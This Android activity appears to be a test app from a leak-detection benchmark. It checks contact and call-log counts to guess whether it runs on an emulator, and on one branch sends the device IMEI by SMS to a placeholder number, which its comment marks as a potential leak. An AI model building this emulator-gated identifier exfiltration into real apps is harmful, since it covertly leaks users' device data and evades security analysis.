package com.example.newedtester;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;

import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;



public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        int numberOfContacts = cur.getCount();
        Cursor cursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        int numberOfcalllogs=cursor.getCount();
        if (numberOfContacts > 5 && numberOfcalllogs >5 )
        {
        status="Contacts_CallLogs: Device";
        }
        else
        {	
        	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        	String imei = telephonyManager.getDeviceId(); 
        	
			SmsManager sm = SmsManager.getDefault();
	    	String number = "+49 1234";
	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
        	status="Contacts_CallLogs: Emulator";
        }
		txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}